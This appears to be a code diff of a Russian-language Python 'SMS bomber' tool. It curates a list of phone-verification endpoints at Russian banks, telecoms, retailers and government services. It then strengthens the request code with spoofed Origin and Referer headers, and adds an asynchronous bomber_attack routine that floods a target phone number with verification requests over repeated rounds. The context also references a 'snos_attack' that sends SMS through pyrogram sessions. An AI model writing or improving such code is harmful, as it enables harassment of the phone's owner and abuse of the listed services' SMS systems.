@@ -52,66 +52,99 @@ USER_AGENTS = [
 ]
 
 # Сайты для бомбера (только веб-запросы)
+# Рабочие сайты для бомбера
 BOMBER_WEBSITES = [
+    # ВКонтакте
     {"url": "https://api.vk.com/method/auth.signup", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.vk.com/method/auth.restore", "method": "POST", "phone_field": "phone"},
+    
+    # Одноклассники
     {"url": "https://ok.ru/dk?cmd=AnonymRegistration", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.mail.ru/oauth/token", "method": "POST", "phone_field": "phone"},
-    {"url": "https://connect.mail.ru/oauth/authorize", "method": "POST", "phone_field": "phone"},
+    
+    # Яндекс
     {"url": "https://passport.yandex.ru/registration-validations/check-phone", "method": "POST", "phone_field": "phone"},
-    {"url": "https://passport.yandex.ru/auth/reg/portal", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.dzen.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.rambler.ru/auth/sms", "method": "POST", "phone_field": "phone"},
-    {"url": "https://web.whatsapp.com/api/sendCode", "method": "POST", "phone_field": "phone_number"},
-    {"url": "https://viber.com/api/request_activation_code", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.viber.com/pa/request_activation_code", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.signal.org/v1/accounts/sms/code/request", "method": "POST", "phone_field": "number"},
-    {"url": "https://api.icq.net/auth/sendCode", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.agent.mail.ru/auth/send", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.yandex.ru/taxi/order", "method": "POST", "phone_field": "phone"},
+    
+    # Delivery Club
     {"url": "https://api.delivery-club.ru/api/v2/auth", "method": "POST", "phone_field": "phone"},
-    {"url": "https://eda.yandex/api/v1/auth", "method": "POST", "phone_field": "phone"},
+    
+    # СберМаркет
     {"url": "https://api.sbermarket.ru/v1/auth", "method": "POST", "phone_field": "phone"},
+    
+    # Самокат
     {"url": "https://api.samokat.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
+    
+    # ВкусВилл
     {"url": "https://api.vkusvill.ru/v1/auth/login", "method": "POST", "phone_field": "phone"},
+    
+    # Магнит
     {"url": "https://api.magnit.ru/v1/auth", "method": "POST", "phone_field": "phone"},
+    
+    # Пятерочка
     {"url": "https://api.pyaterochka.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
+    
+    # Перекресток
     {"url": "https://api.perekrestok.ru/v1/auth", "method": "POST", "phone_field": "phone"},
+    
+    # Лента
     {"url": "https://api.lenta.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
-    {"url": "https://online.sberbank.ru/CSAFront/api/sms/send", "method": "POST", "phone_field": "phone"},
+    
+    # Тинькофф
     {"url": "https://api.tinkoff.ru/v1/sign_up", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.vtb.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
+    
+    # Альфа-Банк
     {"url": "https://api.alfabank.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.qiwi.com/oauth/authorize", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.yoomoney.ru/api/register", "method": "POST", "phone_field": "phone"},
+    
+    # Ozon
     {"url": "https://api.ozon.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
+    
+    # Wildberries
     {"url": "https://api.wildberries.ru/auth/v2/send-code", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.aliexpress.ru/auth/sms", "method": "POST", "phone_field": "phone"},
+    
+    # Авито
     {"url": "https://api.avito.ru/auth/v2/send", "method": "POST", "phone_field": "phone"},
+    
+    # Ситилинк
     {"url": "https://api.citilink.ru/v1/auth", "method": "POST", "phone_field": "phone"},
+    
+    # М.Видео
     {"url": "https://api.mvideo.ru/auth/send", "method": "POST", "phone_field": "phone"},
+    
+    # DNS
     {"url": "https://api.dns-shop.ru/v1/auth", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.lamoda.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.apteka.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.eapteka.ru/v1/auth", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.zdravcity.ru/auth/sms", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.gorzdrav.ru/v1/auth", "method": "POST", "phone_field": "phone"},
+    
+    # МТС
     {"url": "https://api.mts.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
+    
+    # Билайн
     {"url": "https://api.beeline.ru/auth/sms", "method": "POST", "phone_field": "phone"},
+    
+    # Мегафон
     {"url": "https://api.megafon.ru/auth/send", "method": "POST", "phone_field": "phone"},
+    
+    # Tele2
     {"url": "https://api.tele2.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
+    
+    # Госуслуги
     {"url": "https://api.gosuslugi.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.mos.ru/v1/auth", "method": "POST", "phone_field": "phone"},
+    
+    # РЖД
     {"url": "https://api.rzhd.ru/v1/auth/sms", "method": "POST", "phone_field": "phone"},
+    
+    # Аэрофлот
     {"url": "https://api.aeroflot.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
+    
+    # Авто.ру
     {"url": "https://api.auto.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.drom.ru/auth/sms", "method": "POST", "phone_field": "phone"},
+    
+    # Циан
     {"url": "https://api.cian.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
+    
+    # Туту.ру
     {"url": "https://api.tutu.ru/auth/sms", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.booking.com/auth/sms", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.ostrovok.ru/auth/send", "method": "POST", "phone_field": "phone"},
-    {"url": "https://api.svyaznoy.ru/auth/sms", "method": "POST", "phone_field": "phone"},
+    
+    # Детский мир
     {"url": "https://api.detmir.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
+    
+    # Спортмастер
     {"url": "https://api.sportmaster.ru/auth/sms", "method": "POST", "phone_field": "phone"},
 ]
 
@@ -443,18 +476,91 @@ async def send_sms(user_id: int, phone: str) -> dict:
 
 async def send_bomber_request(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
     """Отправка веб-запроса на сайт бомбера"""
-    headers = {'User-Agent': random.choice(USER_AGENTS), 'Content-Type': 'application/json'}
+    headers = {
+        'User-Agent': random.choice(USER_AGENTS),
+        'Content-Type': 'application/json',
+        'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Origin': site["url"].split('/')[2],
+        'Referer': f"https://{site['url'].split('/')[2]}/",
+        'X-Requested-With': 'XMLHttpRequest',
+    }
+    
     payload = {site["phone_field"]: phone}
+    
     try:
         if site["method"] == "POST":
-            async with session.post(site["url"], headers=headers, json=payload, timeout=5, ssl=False) as resp:
-                return {"site": site["url"].split('/')[2], "success": True}
+            async with session.post(
+                site["url"], 
+                headers=headers, 
+                json=payload, 
+                timeout=aiohttp.ClientTimeout(total=10),
+                ssl=False
+            ) as resp:
+                return {"site": site["url"].split('/')[2], "success": True, "status": resp.status}
         else:
-            async with session.get(site["url"], headers=headers, params=payload, timeout=5, ssl=False) as resp:
-                return {"site": site["url"].split('/')[2], "success": True}
-    except:
-        return {"site": site["url"].split('/')[2], "success": False}
+            async with session.get(
+                site["url"], 
+                headers=headers, 
+                params=payload, 
+                timeout=aiohttp.ClientTimeout(total=10),
+                ssl=False
+            ) as resp:
+                return {"site": site["url"].split('/')[2], "success": True, "status": resp.status}
+    except asyncio.TimeoutError:
+        return {"site": site["url"].split('/')[2], "success": False, "error": "timeout"}
+    except aiohttp.ClientError as e:
+        return {"site": site["url"].split('/')[2], "success": False, "error": str(e)[:30]}
+    except Exception as e:
+        return {"site": site["url"].split('/')[2], "success": False, "error": str(e)[:30]}
 
+
+async def bomber_attack(phone: str, rounds: int, progress_callback=None) -> tuple:
+    """Бомбер - только веб-запросы на сайты"""
+    results, ok, err = [], 0, 0
+    connector = aiohttp.TCPConnector(limit=100, force_close=False, ssl=False)
+    timeout = aiohttp.ClientTimeout(total=15)
+    
+    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
+        for rnd in range(1, rounds + 1):
+            tasks = []
+            
+            # Фильтруем только рабочие сайты
+            for site in BOMBER_WEBSITES:
+                tasks.append(send_bomber_request(sess, phone, site))
+            
+            # Выполняем запросы с ограничением параллельности
+            semaphore = asyncio.Semaphore(20)
+            
+            async def limited_request(task):
+                async with semaphore:
+                    return await task
+            
+            limited_tasks = [limited_request(t) for t in tasks]
+            batch = await asyncio.gather(*limited_tasks, return_exceptions=True)
+            
+            round_ok = 0
+            round_err = 0
+            
+            for r in batch:
+                if isinstance(r, dict):
+                    results.append(r)
+                    if r.get("success"):
+                        ok += 1
+                        round_ok += 1
+                    else:
+                        err += 1
+                        round_err += 1
+            
+            if progress_callback:
+                await progress_callback(rnd, rounds, ok, err)
+            
+            logger.info(f"Бомбер раунд {rnd}/{rounds}: успешно {round_ok}, ошибок {round_err}")
+            
+            if rnd < rounds:
+                await asyncio.sleep(3)  # Задержка между раундами
+    
+    return results, ok, err
 
 async def snos_attack(user_id: int, phone: str, rounds: int, progress_callback=None) -> tuple:
     """Снос номера - только SMS через pyrogram сессии"""
